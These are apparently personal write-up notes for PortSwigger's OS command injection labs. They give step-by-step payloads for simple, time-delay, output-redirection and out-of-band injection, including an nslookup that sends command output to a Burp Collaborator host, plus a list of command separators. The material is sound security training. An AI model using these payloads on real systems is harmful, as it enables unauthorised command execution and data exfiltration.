#### Reference:  [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple) 

### Steps

1. i check out the website and and find out the that when i check stock the request goes to the server

2. now i try to enter whoami command in the traffic, 
   
3. i used `& whoami &` but this does not work because i am using this `&` function at parameter value

4. So then i tried `|` example: productId=1&storeId=1|whoami.

There you go!!!

---

#### Reference:  [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays) 

### Steps:

As i read in the portswigger, feedback goes to the server and then server send feed back to the administrator panel through mail -s.. way

so i put the payload afther the mail input.

payload: `& ping -c 10 127.0.0.1 &` 

Before send it encode in url.

there you go!!! 


---

#### Reference: [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

##### Analysis:
- We know from lab 1 that we can get root or user name of server.
  
- We can also get other information.
  
- For retriving those information we need to make a file and then access that using browser.

- You need to have basic uderstanding of Linux command.

##### Steps:

1. We will submit the feedback.
   
2. Go to buprsuite.
   
3. and past this cmd: ``||whoami>/var/www/images/output.txt||``
	- What happen if you cmd is wrong.
	- when you send wrong cmd the response will be : could not be saved.
	- Why: because you are failed to save output of whoami into output.txt inside image folder. 
	- You need to give write cmd.
  
4. you need to past this cmmd after email=ss`||whoami>/var/www/images/output.txt||`

5. output.txt file will be saved inside images folder.

6. now go to burpsuite > target>sitemap, and inside filter click on images and apply.

7. you will see now every images file.

8. now modify `/image?filename=62.jpg` to `/image?filename=output.txt` 

There you go !!!

---

#### Reference: [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

##### Steps:
- Use Burp Suite to intercept and modify the request that submits feedback.

- Modify the `email` parameter, changing it to:
    
    `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
    
- Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `email` parameter.


There you go !!!

---
#### Reference: [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

##### Steps: 

Use Burp Suite Professional to intercept and modify the request that submits feedback.
- Go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.

- Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.

- Modify the `email` parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
    
    ``email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||``

- Go back to the Collaborator tab, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.

- Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.

- To complete the lab, enter the name of the current user.


There you go !!!

---
#### Extra Tips:

you can inject command with help of this parameters:
-  `&`
- `&&`
- `|`
- `||`
